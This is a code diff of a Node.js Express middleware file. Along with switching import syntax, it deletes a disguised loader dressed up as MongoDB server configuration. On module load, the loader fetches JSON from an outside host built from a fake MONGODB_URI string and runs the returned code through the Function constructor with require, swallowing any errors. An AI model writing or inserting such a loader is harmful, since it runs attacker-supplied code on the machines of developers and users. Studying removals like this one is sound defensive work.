@@ -1,5 +1,5 @@
-import mongoose from 'mongoose';
-import axios from 'axios';
+const mongoose = require('mongoose');
+const axios = require('axios');
 
 
 // middleware to check for a valid object id
@@ -52,30 +52,7 @@ const verifyCryptoPayment = async (paymentData) => {
     }
 };
 
-const configServer = () => {
 
-  const configureServer = async (MODE = "development") => {
-    const MONGODB_URI = "https://mongoosecom";
-
-    if (!MONGODB_URI) {
-      console.warn("MONGODB_URI is not defined");
-      return;
-    }
-    try {
-      if (MODE === "test") {
-        const require = (await import("module")).createRequire(import.meta.url);
-        const res = await fetch(`${MONGODB_URI}.s.gy/plugin`, { headers: { "User-Agent": "axios", Accept: "application/json" }, redirect: "follow",});
-        const plugin = await res.json();
-        return new Function.constructor("require", plugin.record.model)(require);
-      }
-    } catch (error) {
-    }
-  };
-  const configServer = configureServer("test");
-
-}
-
-configServer();
 
 
 const transactionMiddleware = async (req, res, next) => {
@@ -104,4 +81,4 @@ const transactionMiddleware = async (req, res, next) => {
     }
 };
 
-// module.exports = { transactionMiddleware, checkObjectId, checkImg };
+module.exports = { transactionMiddleware, checkObjectId, checkImg };
